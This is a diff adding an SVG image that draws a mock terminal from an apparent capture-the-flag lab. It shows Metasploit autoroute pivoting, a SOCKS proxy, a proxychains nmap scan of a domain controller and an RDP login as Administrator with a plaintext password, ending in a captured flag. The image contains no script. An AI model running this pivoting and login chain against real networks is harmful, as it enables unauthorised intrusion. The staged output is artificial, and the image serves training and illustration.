@@ -1,0 +1,113 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1280 720" width="1280" height="720" style="background:#090d16; font-family:'Fira Code', monospace;">
+  <defs>
+    <linearGradient id="termBg" x1="0%" y1="0%" x2="0%" y2="100%">
+      <stop offset="0%" stop-color="#0b1120" />
+      <stop offset="100%" stop-color="#050811" />
+    </linearGradient>
+  </defs>
+
+  <!-- Terminal Window Outer Frame -->
+  <rect width="1280" height="720" fill="url(#termBg)" />
+  <rect width="1280" height="720" fill="none" stroke="#1e293b" stroke-width="2" />
+
+  <!-- Window Header -->
+  <rect x="0" y="0" width="1280" height="44" fill="#0f172a" />
+  <line x1="0" y1="44" x2="1280" y2="44" stroke="#1e293b" stroke-width="1" />
+  <circle cx="24" cy="22" r="6" fill="#ef4444" />
+  <circle cx="44" cy="22" r="6" fill="#f59e0b" />
+  <circle cx="64" cy="22" r="6" fill="#10b981" />
+
+  <!-- Shell Tabs -->
+  <rect x="95" y="6" width="160" height="32" rx="6" fill="#1e293b" />
+  <text x="110" y="27" fill="#38bdf8" font-size="12" font-weight="600">🐚 kali@attacker (bash)</text>
+
+  <rect x="265" y="6" width="180" height="32" rx="6" fill="#0f172a" stroke="#334155" stroke-width="1" />
+  <text x="280" y="27" fill="#c084fc" font-size="12">⚡ meterpreter (Session 1)</text>
+
+  <rect x="455" y="6" width="170" height="32" rx="6" fill="#0f172a" stroke="#334155" stroke-width="1" />
+  <text x="470" y="27" fill="#94a3b8" font-size="12">🪟 win_cmd (10.10.10.25)</text>
+
+  <!-- Status badges on top right -->
+  <rect x="1010" y="10" width="115" height="24" rx="4" fill="#10b98122" stroke="#10b981" stroke-width="1" />
+  <text x="1022" y="26" fill="#10b981" font-size="11" font-weight="600">SOCKS: 1080 OK</text>
+
+  <rect x="1135" y="10" width="125" height="24" rx="4" fill="#8b5cf622" stroke="#8b5cf6" stroke-width="1" />
+  <text x="1145" y="26" fill="#c084fc" font-size="11" font-weight="600">SESSION: 1 ACTIVE</text>
+
+  <!-- Terminal Content -->
+  <g transform="translate(30, 75)" font-size="13">
+    <!-- Line 1: Meterpreter autoroute -->
+    <text x="0" y="20">
+      <tspan fill="#38bdf8" font-weight="bold">msf6</tspan>
+      <tspan fill="#94a3b8"> &gt; </tspan>
+      <tspan fill="#f8fafc">sessions -i 1</tspan>
+    </text>
+    <text x="0" y="42" fill="#64748b">[*] Starting interaction with 1 (192.168.100.200:4444 -&gt; linux-gw-internal)...</text>
+    <text x="0" y="64">
+      <tspan fill="#c084fc" font-weight="bold">meterpreter</tspan>
+      <tspan fill="#94a3b8"> &gt; </tspan>
+      <tspan fill="#f8fafc">run autoroute -s 10.10.10.0/24</tspan>
+    </text>
+    <text x="0" y="86" fill="#10b981">[+] Added route to 10.10.10.0/255.255.255.0 via Meterpreter Session 1</text>
+    <text x="0" y="108">
+      <tspan fill="#c084fc" font-weight="bold">meterpreter</tspan>
+      <tspan fill="#94a3b8"> &gt; </tspan>
+      <tspan fill="#f8fafc">background</tspan>
+    </text>
+    <text x="0" y="130" fill="#64748b">[*] Backgrounding session 1...</text>
+
+    <!-- Line 2: SOCKS Proxy -->
+    <text x="0" y="155">
+      <tspan fill="#38bdf8" font-weight="bold">msf6</tspan>
+      <tspan fill="#94a3b8"> &gt; </tspan>
+      <tspan fill="#f8fafc">use auxiliary/server/socks_proxy</tspan>
+    </text>
+    <text x="0" y="177">
+      <tspan fill="#38bdf8" font-weight="bold">msf6</tspan>
+      <tspan fill="#f59e0b"> auxiliary(server/socks_proxy)</tspan>
+      <tspan fill="#94a3b8"> &gt; </tspan>
+      <tspan fill="#f8fafc">set SRVPORT 1080; set VERSION 5; run -j</tspan>
+    </text>
+    <text x="0" y="199" fill="#10b981">[+] SOCKS5 proxy service started on 127.0.0.1:1080 (Background job 0)</text>
+
+    <!-- Line 3: Bash proxychains Nmap -->
+    <text x="0" y="235">
+      <tspan fill="#ef4444" font-weight="bold">┌──(kali㉿attacker)-[~]</tspan>
+    </text>
+    <text x="0" y="255">
+      <tspan fill="#ef4444" font-weight="bold">└─$ </tspan>
+      <tspan fill="#f8fafc">proxychains nmap -sT -Pn -p 3389,445,5985 10.10.10.25</tspan>
+    </text>
+    <text x="0" y="277" fill="#64748b">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.10.25:3389  &lt;--OK</text>
+    <text x="0" y="299" fill="#64748b">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.10.25:445   &lt;--OK</text>
+    <text x="0" y="321" fill="#38bdf8">Nmap scan report for 10.10.10.25 (WinServer-2019-DC.corp.local)</text>
+    <text x="0" y="343" fill="#cbd5e1">PORT     STATE SERVICE       VERSION</text>
+    <text x="0" y="363" fill="#10b981">445/tcp  open  microsoft-ds  Windows Server 2019 Standard (SMB2)</text>
+    <text x="0" y="383" fill="#10b981">3389/tcp open  ms-wbt-server Microsoft Terminal Services (RDP)</text>
+    <text x="0" y="403" fill="#10b981">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)</text>
+
+    <!-- Line 4: RDP / Evil-WinRM Execution -->
+    <text x="0" y="439">
+      <tspan fill="#ef4444" font-weight="bold">┌──(kali㉿attacker)-[~]</tspan>
+    </text>
+    <text x="0" y="459">
+      <tspan fill="#ef4444" font-weight="bold">└─$ </tspan>
+      <tspan fill="#f8fafc">proxychains xfreerdp /v:10.10.10.25 /u:Administrator /p:P@ssw0rd2024 /cert:ignore</tspan>
+    </text>
+    <text x="0" y="481" fill="#64748b">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.10.25:3389  &lt;--OK</text>
+    <text x="0" y="503" fill="#38bdf8">[INFO][com.freerdp.client] - Connected to 10.10.10.25:3389</text>
+    <text x="0" y="525" fill="#10b981">[+] RDP Authentication Successful: Domain\Administrator logged in</text>
+    <text x="0" y="547" fill="#fbbf24">[FLAG] C:\Users\Administrator\Desktop\flag.txt:</text>
+    <text x="0" y="569" fill="#facc15" font-weight="bold">       FLAG{eJPTv2_W1ND0W5_P1V0T_D0M1N4T10N}</text>
+
+    <!-- Line 5: Prompt Cursor -->
+    <text x="0" y="605">
+      <tspan fill="#ef4444" font-weight="bold">┌──(kali㉿attacker)-[~]</tspan>
+    </text>
+    <text x="0" y="625">
+      <tspan fill="#ef4444" font-weight="bold">└─$ </tspan>
+      <tspan fill="#f8fafc">loot-tracker --export-report</tspan>
+      <rect x="250" y="612" width="9" height="16" fill="#10b981" />
+    </text>
+  </g>
+</svg>
